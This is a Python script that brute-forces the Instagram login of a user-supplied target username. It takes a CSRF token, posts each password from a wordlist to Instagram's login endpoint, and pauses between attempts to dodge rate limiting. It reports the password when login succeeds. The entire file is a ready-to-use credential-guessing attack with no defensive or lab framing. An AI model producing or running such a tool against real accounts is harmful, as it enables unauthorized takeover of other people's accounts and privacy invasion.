import requests
import time

# Instagram login URL
LOGIN_URL = "https://www.instagram.com/accounts/login/ajax/"

# Headers to mimic a real browser
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
    "Referer": "https://www.instagram.com/accounts/login/",
}

# Function to attempt login
def attempt_login(username, password):
    session = requests.Session()
    session.headers.update(HEADERS)

    # Get CSRF token
    response = session.get("https://www.instagram.com/accounts/login/")
    csrf_token = response.cookies.get("csrftoken")

    # Prepare login payload
    payload = {
        "username": username,
        "password": password,
        "queryParams": "{}",
        "optIntoOneTap": "false",
    }
    headers = {
        "X-CSRFToken": csrf_token,
    }

    # Send login request
    login_response = session.post(LOGIN_URL, data=payload, headers=headers)
    return login_response.json()

# Function to brute-force login
def brute_force(username, wordlist):
    with open(wordlist, "r") as file:
        passwords = file.read().splitlines()

    for password in passwords:
        print(f"Trying password: {password}")
        result = attempt_login(username, password)

        if result.get("authenticated"):
            print(f"[+] Success! Password found: {password}")
            return password
        else:
            print(f"[-] Failed: {password}")

        # Avoid rate-limiting
        time.sleep(2)

    print("[-] No valid password found in the wordlist.")
    return None

# Main function
if __name__ == "__main__":
    username = input("Enter the target username: ")
    wordlist = input("Enter the path to the wordlist file (e.g., passwords.txt): ")

    print(f"[*] Starting brute-force attack on {username}...")
    brute_force(username, wordlist)
